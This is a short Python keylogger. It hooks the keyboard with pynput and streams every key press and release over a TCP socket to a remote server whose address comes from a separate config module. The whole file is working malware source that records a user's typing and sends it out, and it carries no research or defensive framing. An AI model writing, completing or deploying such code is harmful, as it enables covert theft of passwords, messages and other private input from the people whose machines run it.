import socket
from pynput import keyboard
import sys
from _env import SERVER_IP, SERVER_PORT

# set up socket
server_ip = SERVER_IP
server_port = SERVER_PORT

# establish connection once
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((server_ip, server_port))
    
    def on_press(key):
        try:
            message = key.char
        except AttributeError:
            message = str(key)

        message = f'Press {message}'
        # send the keystroke to the host
        s.sendall(message.encode('utf-8'))

    def on_release(key):
        try:
            message = key.char
        except AttributeError:
            message = str(key)

        message = f'Release {message}'
        # send the keystroke to the host
        s.sendall(message.encode('utf-8'))

    # start listening to the keyboard
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

